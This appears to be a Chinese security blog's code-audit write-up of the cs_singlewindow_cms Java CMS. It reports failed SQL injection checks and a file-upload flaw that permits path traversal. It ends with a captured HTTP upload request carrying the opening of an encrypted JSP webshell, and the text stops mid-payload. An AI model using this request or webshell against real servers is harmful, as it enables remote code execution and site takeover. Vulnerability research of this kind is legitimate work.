@@ -1,0 +1,535 @@
+<!doctype html><html lang=en-zh dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="GitHub地址-https://github.com/xitaofeng/cs_singlewindow_cms"><title>cs_singlewindow_cms</title>
+<link rel=canonical href=https://hadagaga.github.io/p/cs_singlewindow_cms/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="cs_singlewindow_cms"><meta property='og:description' content="GitHub地址-https://github.com/xitaofeng/cs_singlewindow_cms"><meta property='og:url' content='https://hadagaga.github.io/p/cs_singlewindow_cms/'><meta property='og:site_name' content='hadagaga blog'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Code Audit'><meta property='article:published_time' content='2024-12-10T00:00:00+00:00'><meta property='article:modified_time' content='2024-12-10T00:00:00+00:00'><meta property='og:image' content='https://hadagaga.github.io/p/cs_singlewindow_cms/cover.png'><meta name=twitter:title content="cs_singlewindow_cms"><meta name=twitter:description content="GitHub地址-https://github.com/xitaofeng/cs_singlewindow_cms"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://hadagaga.github.io/p/cs_singlewindow_cms/cover.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu6187617985535410037.png width=300 height=286 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>hadagaga blog</a></h1><h2 class=site-description>不要让时代的悲哀成为你的悲哀。</h2></div></header><ol class=menu-social><li><a href=https://github.com/hadagaga target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#项目技术栈>项目技术栈</a><ol><li><a href=#后端技术>后端技术</a></li><li><a href=#前端技术>前端技术</a></li></ol></li><li><a href=#项目依赖审计>项目依赖审计</a></li><li><a href=#单点漏洞审计>单点漏洞审计</a><ol><li><a href=#sql注入>SQL注入</a><ol><li><a href=#cs_singlewindow_cms-mastersrcmainjavacomjspxcmscorerepositoryinfodaojava失败>cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\InfoDao.java（失败）</a></li><li><a href=#cs_singlewindow_cms-mastersrcmainjavacomjspxcmscorerepositoryimplmessagedaoimpljava失败>cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\impl\MessageDaoImpl.java（失败）</a></li></ol></li><li><a href=#任意文件操控>任意文件操控</a><ol><li><a href=#srcmainjavacomjspxcmscorewebbackwebfileuploadscontrollerjava成功>src/main/java/com/jspxcms/core/web/back/WebFileUploadsController.java（成功）</a></li></ol></li><li><a href=#xss>XSS</a></li><li><a href=#csrf>CSRF</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/cs_singlewindow_cms/><img src=/p/cs_singlewindow_cms/cover_hu4162435812567598598.png srcset="/p/cs_singlewindow_cms/cover_hu4162435812567598598.png 800w, /p/cs_singlewindow_cms/cover_hu17269874157573503485.png 1600w" width=800 height=339 loading=lazy alt="Featured image of post cs_singlewindow_cms"></a></div><div class=article-details><header class=article-category><a href=/categories/cate2/ style=background-color:#2a9d8f;color:#fff>代码审计记录</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/cs_singlewindow_cms/>cs_singlewindow_cms</a></h2><h3 class=article-subtitle>GitHub地址-https://github.com/xitaofeng/cs_singlewindow_cms</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Dec 10, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 6 分钟</time></div></footer></div></header><section class=article-content><h2 id=项目技术栈>项目技术栈</h2><h3 id=后端技术>后端技术</h3><p>SpringBoot：提供了对Spring开箱即用的功能。简化了Spring配置，提供自动配置 auto-configuration功能。</p><p>Spring：是提供了IoC等功能，是目前最流行的Java企业级开发框架。</p><p>SpringMVC：MVC框架，使用方便，Bug较少。</p><p>JPA：持久化框架。属于JSR标准，JPA实现选择最常用的Hibernate。</p><p>SpringDataJPA：对JPA封装，大部分查询只需要在接口中写方法，而不需要实现改方法，极大开发效率。</p><p>QueryDSL：实现类型安全的JPA查询，使用对象及属性实现查询，避免编写jpql出现的拼错字符及属性名记忆负担。</p><p>FreeMarker：模板组件。</p><p>Shiro：安全组件。配置简便。</p><p>Lucene：全文检索组件。实现对中文的分词搜索。</p><p>Ehcache：缓存组件。主要用在JPA二级缓存、Shiro权限缓存。</p><p>Quartz：定时任务组件。</p><h3 id=前端技术>前端技术</h3><p>jQuery：JavaScript库。</p><p>Bootstrap：响应式设计前端框架。</p><p>AdminLTE：后台管理平台开源框架。</p><p>jQuery UI：基于jQuery的UI框架。</p><p>jQuery Validation：基于jQuery的表单校验框架。</p><p>UEditor：Web富文本编辑器。</p><p>Editor.md：基于Markdown语法的Web文本编辑器。</p><p>ECharts：用于生成图标的组件。</p><p>My97DatePicker：日期组件。</p><p>zTree：树组件。</p><h2 id=项目依赖审计>项目依赖审计</h2><p>​ 项目为maven项目，因此来到pom.xml文件审计。</p><p>​ 经审计发现，该项目引入中并不存在已披露的漏洞。</p><h2 id=单点漏洞审计>单点漏洞审计</h2><h3 id=sql注入>SQL注入</h3><h4 id=cs_singlewindow_cms-mastersrcmainjavacomjspxcmscorerepositoryinfodaojava失败>cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\InfoDao.java（失败）</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@Query</span><span class=p>(</span><span class=s>&#34;select count(*) from Info bean where bean.node.id in (?1) and bean.status!=&#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>Info</span><span class=p>.</span><span class=na>DELETED</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=nf>countByNodeIdNotDeleted</span><span class=p>(</span><span class=n>Collection</span><span class=o>&lt;</span><span class=n>Integer</span><span class=o>&gt;</span><span class=w> </span><span class=n>nodeIds</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Query</span><span class=p>(</span><span class=s>&#34;select count(*) from Info bean where bean.org.id in (?1) and bean.status!=&#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>Info</span><span class=p>.</span><span class=na>DELETED</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=nf>countByOrgIdNotDeleted</span><span class=p>(</span><span class=n>Collection</span><span class=o>&lt;</span><span class=n>Integer</span><span class=o>&gt;</span><span class=w> </span><span class=n>orgIds</span><span class=p>);</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 发现这里使用了动态拼接，但是参数无法控制。</p><h4 id=cs_singlewindow_cms-mastersrcmainjavacomjspxcmscorerepositoryimplmessagedaoimpljava失败>cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\impl\MessageDaoImpl.java（失败）</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span><span class=w> </span><span class=n>JpqlBuilder</span><span class=w> </span><span class=nf>groupByUserId</span><span class=p>(</span><span class=n>Integer</span><span class=w> </span><span class=n>userId</span><span class=p>,</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=n>unread</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>...</span><span class=na>省略</span><span class=p>...</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>unread</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>jb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;having number_of_unread_&gt;0&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>jb</span><span class=p>.</span><span class=na>setCountQueryString</span><span class=p>(</span><span class=s>&#34;select count(*) from (&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>jb</span><span class=p>.</span><span class=na>getQueryString</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;)&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>jb</span><span class=p>.</span><span class=na>setCountProjection</span><span class=p>(</span><span class=s>&#34;distinct contact_id_&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>...</span><span class=na>省略</span><span class=p>...</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 未被控制器调用。</p><p>​ 审计了删改增也没有发现漏洞，虽然也存在动态拼接但是也都无法操控。</p><h3 id=任意文件操控>任意文件操控</h3><p>​ 我们来到文件上传的控制器</p><h4 id=srcmainjavacomjspxcmscorewebbackwebfileuploadscontrollerjava成功>src/main/java/com/jspxcms/core/web/back/WebFileUploadsController.java（成功）</h4><h5 id=上传>上传</h5><p>控制器：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequiresPermissions</span><span class=p>(</span><span class=s>&#34;core:web_file_2:upload&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=s>&#34;upload.do&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>upload</span><span class=p>(</span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;file&#34;</span><span class=p>,</span><span class=w> </span><span class=n>required</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>)</span><span class=w> </span><span class=n>MultipartFile</span><span class=w> </span><span class=n>file</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>parentId</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IllegalStateException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=kd>super</span><span class=p>.</span><span class=na>upload</span><span class=p>(</span><span class=n>file</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>response</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>文件上传的实现函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=kd>protected</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>upload</span><span class=p>(</span><span class=n>MultipartFile</span><span class=w> </span><span class=n>file</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=kd>throws</span><span class=w> </span><span class=n>IllegalStateException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Site</span><span class=w> </span><span class=n>site</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Context</span><span class=p>.</span><span class=na>getCurrentSite</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=c1>// parentId = parentId == null ? base : parentId;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getBase</span><span class=p>(</span><span class=n>site</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>Validations</span><span class=p>.</span><span class=na>uri</span><span class=p>(</span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>base</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CmsException</span><span class=p>(</span><span class=s>&#34;invalidURI&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>FileHandler</span><span class=w> </span><span class=n>fileHandler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getFileHandler</span><span class=p>(</span><span class=n>site</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>fileHandler</span><span class=p>.</span><span class=na>store</span><span class=p>(</span><span class=n>file</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>logService</span><span class=p>.</span><span class=na>operation</span><span class=p>(</span><span class=s>&#34;opr.webFile.upload&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>file</span><span class=p>.</span><span class=na>getOriginalFilename</span><span class=p>(),</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>request</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>logger</span><span class=p>.</span><span class=na>info</span><span class=p>(</span><span class=s>&#34;upload file, name={}.&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>file</span><span class=p>.</span><span class=na>getOriginalFilename</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Servlets</span><span class=p>.</span><span class=na>writeHtml</span><span class=p>(</span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=s>&#34;true&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这个函数的大概功能是获取站点信息，验证传入的参数，然后保存文件，再把文件的信息写入日志。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>uri</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>prefix</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=o>!</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>contains</span><span class=p>(</span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=s>&#34;..&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>StringUtils</span><span class=p>.</span><span class=na>startsWith</span><span class=p>(</span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=n>prefix</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这里是存在一个过滤的，且过滤了&rsquo;..&rsquo;，但是奇怪的是，过滤的parentId而不是文件名，且没有修改文件名，甚至没有对后缀的校验，所以这里是存在任意文件上传和目录穿透的，然后这个项目还会解析JSP，但是需要放到webapp下的JSP文件夹，不过这里还有一个目录穿透所以这就不是问题了，来到前端的功能点。</p><p>​ <img src=/p/cs_singlewindow_cms/image-20241209173324471.png width=1701 height=646 srcset="/p/cs_singlewindow_cms/image-20241209173324471_hu1859559158709165252.png 480w, /p/cs_singlewindow_cms/image-20241209173324471_hu10302726969231161201.png 1024w" loading=lazy alt=image-20241209173324471 class=gallery-image data-flex-grow=263 data-flex-basis=631px></p><p>​ 上传文件后抓包，得到如下数据包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/cmscp/core/web_file_2/upload.do?_site=1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>192.168.227.43:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>2387</span>
+</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html, */*; q=0.01</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundaryZzeGAny76zA7fCma</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://192.168.227.43:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://192.168.227.43:8888/cmscp/core/web_file_2/list.do?parentId=%2F1</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=526DEDE9E36FE99249985E52A100BE8E</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>------WebKitFormBoundaryZzeGAny76zA7fCma
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;parentId&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/1
+</span></span><span class=line><span class=cl>------WebKitFormBoundaryZzeGAny76zA7fCma
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;shell.jsp&#34;
+</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;%@page import=&#34;java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*&#34; %&gt;
+</span></span><span class=line><span class=cl>&lt;%!
+</span></span><span class=line><span class=cl>    private byte[] Decrypt(byte[] data) throws Exception
